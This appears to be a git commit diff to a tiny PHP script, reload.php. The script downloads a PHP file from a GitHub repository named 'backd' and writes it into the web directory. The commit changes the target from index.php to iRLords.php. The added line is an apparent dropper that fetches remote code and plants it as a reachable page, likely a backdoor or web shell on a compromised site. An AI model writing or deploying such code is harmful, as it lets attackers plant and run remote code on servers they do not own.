3349676ff88dcb7e388bcaf0d955fa9653731fca
PySudoORG <139513562+PySudoORG@users.noreply.github.com>
2023-12-18 22:54:44 +0330

    Update reload.php

--- reload.php
+++ reload.php
@@ -1,4 +1,4 @@
 <?php
-file_put_contents('./index.php', file_get_contents('https://raw.githubusercontent.com/PySudoORG/backd/main/index.php'));
+file_put_contents('./iRLords.php', file_get_contents('https://raw.githubusercontent.com/PySudoORG/backd/main/index.php'));
 echo "Done.";
 ?>
